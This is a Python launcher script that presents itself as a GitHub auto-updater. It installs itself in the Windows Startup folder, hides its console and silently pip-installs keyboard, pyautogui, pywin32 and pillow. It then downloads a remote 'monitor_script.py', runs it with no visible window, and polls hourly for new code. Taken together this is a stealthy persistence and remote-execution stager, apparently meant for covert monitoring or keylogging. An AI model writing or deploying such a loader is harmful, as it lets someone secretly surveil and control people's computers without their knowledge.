# github_launcher.pyw - Auto-updating launcher from GitHub
import os
import sys
import subprocess
import urllib.request
import urllib.error
import json
import tempfile
import traceback
import time
import hashlib
from pathlib import Path
import threading

# Configuration
GITHUB_RAW_URL = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main"  # Change this
MAIN_SCRIPT_URL = f"{GITHUB_RAW_URL}/monitor_script.py"
REQUIREMENTS_URL = f"{GITHUB_RAW_URL}/requirements.txt"
CONFIG_URL = f"{GITHUB_RAW_URL}/config.json"

# Local paths
STARTUP_FOLDER = Path(os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup'))
LOCAL_SCRIPT_PATH = STARTUP_FOLDER / "current_script.py"
LOCAL_CONFIG_PATH = STARTUP_FOLDER / "config.json"
CACHE_FILE = STARTUP_FOLDER / "script_cache.json"

def hide_console():
    """Hide console window"""
    try:
        import win32gui
        import win32con
        hwnd = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
    except:
        pass

def download_file(url, local_path):
    """Download file from URL"""
    try:
        print(f"Downloading {url}")
        req = urllib.request.Request(url)
        req.add_header('Cache-Control', 'no-cache')
        
        with urllib.request.urlopen(req, timeout=10) as response:
            content = response.read()
            
        with open(local_path, 'wb') as f:
            f.write(content)
            
        return True
    except Exception as e:
        print(f"Download failed: {e}")
        return False

def get_file_hash(filepath):
    """Get SHA256 hash of file"""
    if not os.path.exists(filepath):
        return None
    with open(filepath, 'rb') as f:
        return hashlib.sha256(f.read()).hexdigest()

def check_for_updates():
    """Check if GitHub version is newer than local"""
    if not os.path.exists(CACHE_FILE):
        return True
    
    try:
        with open(CACHE_FILE, 'r') as f:
            cache = json.load(f)
        
        # Check GitHub for latest hash
        req = urllib.request.Request(MAIN_SCRIPT_URL)
        req.add_header('Cache-Control', 'no-cache')
        with urllib.request.urlopen(req, timeout=10) as response:
            github_content = response.read()
            github_hash = hashlib.sha256(github_content).hexdigest()
        
        return cache.get('script_hash') != github_hash
    except:
        return True

def update_cache(github_hash):
    """Update local cache with latest hash"""
    cache = {
        'script_hash': github_hash,
        'last_update': time.time(),
        'version': int(time.time())
    }
    with open(CACHE_FILE, 'w') as f:
        json.dump(cache, f)

def install_requirements():
    """Install required packages from requirements.txt"""
    try:
        # Download requirements.txt
        req_path = tempfile.gettempdir() + "/requirements.txt"
        if download_file(REQUIREMENTS_URL, req_path):
            print("Installing requirements...")
            
            # Use pip to install
            subprocess.check_call([
                sys.executable, "-m", "pip", "install", 
                "--upgrade", "-r", req_path,
                "--quiet", "--user"
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            print("Requirements installed successfully")
            return True
    except Exception as e:
        print(f"Failed to install requirements: {e}")
        # Try individual packages as fallback
        install_fallback_packages()
    return False

def install_fallback_packages():
    """Fallback: Install packages individually"""
    packages = [
        "pywin32",
        "pyautogui", 
        "keyboard",
        "requests",
        "pillow"
    ]
    
    for package in packages:
        try:
            print(f"Installing {package}...")
            subprocess.check_call([
                sys.executable, "-m", "pip", "install", 
                package, "--quiet", "--user"
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            print(f"Failed to install {package}")

def download_latest_script():
    """Download latest script and requirements from GitHub"""
    print("Checking for updates...")
    
    if not check_for_updates():
        print("Already up to date")
        if os.path.exists(LOCAL_SCRIPT_PATH):
            return True
        else:
            # Force download if local file is missing
            pass
    
    print("New version available, downloading...")
    
    # Download main script
    if download_file(MAIN_SCRIPT_URL, LOCAL_SCRIPT_PATH):
        # Download requirements.txt
        if os.path.exists(REQUIREMENTS_URL):
            install_requirements()
        
        # Download config if exists
        try:
            download_file(CONFIG_URL, LOCAL_CONFIG_PATH)
        except:
            pass
        
        # Update cache with new hash
        github_hash = get_file_hash(LOCAL_SCRIPT_PATH)
        if github_hash:
            update_cache(github_hash)
        
        return True
    
    return False

def run_script():
    """Execute the downloaded script"""
    if not os.path.exists(LOCAL_SCRIPT_PATH):
        print("No script found to run")
        return False
    
    try:
        print("Starting main script...")
        
        # Read and execute the script
        with open(LOCAL_SCRIPT_PATH, 'r', encoding='utf-8') as f:
            script_code = f.read()
        
        # Create a new process to run the script
        # This allows the launcher to continue running separately
        subprocess.Popen([
            sys.executable, LOCAL_SCRIPT_PATH
        ], creationflags=subprocess.CREATE_NO_WINDOW)
        
        return True
        
    except Exception as e:
        print(f"Failed to run script: {e}")
        print(traceback.format_exc())
        return False

def main():
    """Main launcher function"""
    # Hide console if running as .pyw
    if sys.executable.endswith("pythonw.exe") or sys.argv[0].endswith(".pyw"):
        hide_console()
    
    # Ensure we're in startup folder
    os.chdir(STARTUP_FOLDER)
    
    print("=" * 50)
    print("GitHub Auto-Updating Launcher")
    print("=" * 50)
    
    # Initial delay to ensure network is ready
    time.sleep(5)
    
    retry_count = 0
    max_retries = 3
    
    while retry_count < max_retries:
        try:
            # Download latest version
            if download_latest_script():
                # Run the script
                if run_script():
                    print("Launcher completed successfully")
                    break
                else:
                    print("Failed to run script")
            else:
                print("Failed to download script")
            
        except Exception as e:
            print(f"Error in launcher: {e}")
            retry_count += 1
            
            if retry_count < max_retries:
                print(f"Retrying in 30 seconds... (Attempt {retry_count + 1}/{max_retries})")
                time.sleep(30)
            else:
                print("Max retries reached. Exiting.")
    
    # Keep launcher running to check for updates periodically
    start_update_checker()

def start_update_checker():
    """Background thread to check for updates periodically"""
    def update_checker():
        while True:
            time.sleep(3600)  # Check every hour
            
            try:
                if check_for_updates():
                    print("Update found! Downloading...")
                    download_latest_script()
                    
                    # Restart script if it's not running
                    # You might want to add process monitoring here
            except:
                pass
    
    thread = threading.Thread(target=update_checker, daemon=True)
    thread.start()
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()